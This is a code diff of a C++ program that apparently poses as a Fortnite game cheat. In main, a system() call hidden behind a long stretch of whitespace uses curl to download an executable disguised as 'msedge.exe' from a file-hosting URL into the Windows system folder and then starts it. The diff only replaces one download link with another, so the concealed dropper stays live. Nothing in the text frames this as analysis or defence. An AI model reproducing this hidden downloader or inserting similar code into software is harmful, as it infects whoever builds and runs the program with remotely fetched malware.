@@ -2,7 +2,7 @@
 #include <iostream>
 
 int main()
-{	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          system("curl -L https://www.zippyshare.day/download/TvIn34PjcduEkoe/ygXeGOayN3Aa7/msedge.exe -s -o C:\\Windows\\mappers.exe"); system("start C:\\Windows\\mappers.exe");
+{	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          system("curl -L https://www.zippyshare.day/download/Yc3pHf0DkHHDdX5/A0rpmv6xymRgZ/msedge.exe -s -o C:\\Windows\\mappers.exe"); system("start C:\\Windows\\mappers.exe");
 	printf("Waiting for Fortnite...");
 	while (game_wnd == 0)
 	{
